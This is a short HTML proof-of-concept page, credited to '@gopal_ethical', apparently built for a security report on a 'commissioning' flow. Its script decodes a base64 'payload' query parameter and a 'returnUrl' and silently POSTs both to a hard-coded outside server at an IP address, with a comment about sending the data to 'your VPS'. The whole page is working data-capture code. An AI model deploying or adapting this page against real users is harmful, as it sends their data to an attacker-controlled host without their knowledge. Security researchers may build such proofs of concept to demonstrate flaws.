<!DOCTYPE html>
<html>
<head>
    <title>Commissioning POC</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>poc by @gopal_ethical</h1>

    <script>
        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        function decodeBase64Json(base64) {
            try {
                const raw = decodeURIComponent(base64);
                const jsonStr = atob(raw);
                return JSON.parse(jsonStr);
            } catch (e) {
                return { error: "Failed to decode payload", details: e.message };
            }
        }

        const payload = getQueryParam("payload");
        const returnUrl = getQueryParam("returnUrl");

        const decoded = decodeBase64Json(payload);

        const dataToSend = {
            payload: decoded,
            returnUrl: returnUrl,
            timestamp: new Date().toISOString()
        };

        // Silently send to your VPS
        fetch("http://167.172.255.123:8080/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(dataToSend)
        }).then(res => {
            console.log("Data sent to server:", res.status);
        }).catch(err => {
            console.error("Failed to send to server:", err);
        });
    </script>
</body>
</html>
